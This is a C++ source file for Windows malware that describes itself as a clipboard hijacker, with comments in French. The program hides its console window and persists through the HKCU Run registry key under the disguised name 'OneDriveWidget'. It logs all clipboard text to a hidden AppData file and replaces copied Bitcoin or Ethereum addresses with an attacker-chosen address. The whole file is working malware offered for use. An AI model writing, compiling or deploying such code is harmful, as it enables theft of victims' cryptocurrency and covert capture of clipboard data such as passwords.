// language: C++17, file: src/tools/04_clipboard.cpp, target: Windows 10/11, MSVC/MinGW
// Clipboard hijacker - log du presse-papiers + remplacement d'adresses crypto
// Usage: clipboard.exe <adresse_attaquant>   (defaut: adresse de demo)
// MinGW: g++ -O2 -std=c++17 04_clipboard.cpp -o clip.exe -ladvapi32
#include <windows.h>
#include <cstdio>
#include <cstring>
#include <string>

#pragma comment(lib, "advapi32.lib")

static void Persist(const char* name) {
    // HKCU\...\Run - survit au reboot sans droits admin
    char path[MAX_PATH]; GetModuleFileNameA(NULL, path, MAX_PATH);
    HKEY k;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_SET_VALUE, &k) == ERROR_SUCCESS) {
        RegSetValueExA(k, name, 0, REG_SZ, (BYTE*)path, (DWORD)strlen(path) + 1);
        RegCloseKey(k);
    }
}

static bool IsBtc(const char* s) {
    // detection souple: prefixe 1/3/bc1, longueur plausible base58/bech32
    size_t n = strlen(s);
    if (n < 26 || n > 62) return false;
    if (s[0] == '1' || s[0] == '3') return n >= 26 && n <= 35;
    if (strncmp(s, "bc1", 3) == 0) return n >= 14 && n <= 62;
    return false;
}
static bool IsEth(const char* s) {
    size_t n = strlen(s);
    if (n != 42) return false;
    if (strncmp(s, "0x", 2) != 0) return false;
    for (size_t i = 2; i < n; i++) {
        char c = s[i];
        if (!((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F'))) return false;
    }
    return true;
}

static void ReplaceClipboard(const char* addr) {
    // remplace le contenu textuel par l'adresse de l'attaquant
    EmptyClipboard();
    size_t n = strlen(addr) + 1;
    HGLOBAL h = GlobalAlloc(GMEM_MOVEABLE, n);
    if (!h) return;
    memcpy(GlobalLock(h), addr, n);
    GlobalUnlock(h);
    SetClipboardData(CF_TEXT, h);
}

static void LogClip(const char* text) {
    char path[MAX_PATH];
    GetEnvironmentVariableA("APPDATA", path, MAX_PATH);
    strcat_s(path, "\\RickCache");
    CreateDirectoryA(path, NULL);
    strcat_s(path, "\\clip.log");
    FILE* f = fopen(path, "a");
    if (f) { fprintf(f, "%s\n", text); fclose(f); }
}

int main(int argc, char** argv) {
    FreeConsole();
    const char* atk = argc > 1 ? argv[1] : "bc1qdemoaddr0rickandmortyc137xxxxxxxxx";
    Persist("OneDriveWidget");

    for (;;) {
        if (OpenClipboard(NULL)) {
            HANDLE h = GetClipboardData(CF_TEXT);
            if (h) {
                const char* text = (const char*)GlobalLock(h);
                if (text && *text) {
                    LogClip(text);
                    if (IsBtc(text) || IsEth(text)) {
                        ReplaceClipboard(atk);
                    }
                }
                if (h) GlobalUnlock(h);
            }
            CloseClipboard();
        }
        Sleep(400);
    }
    return 0;
}
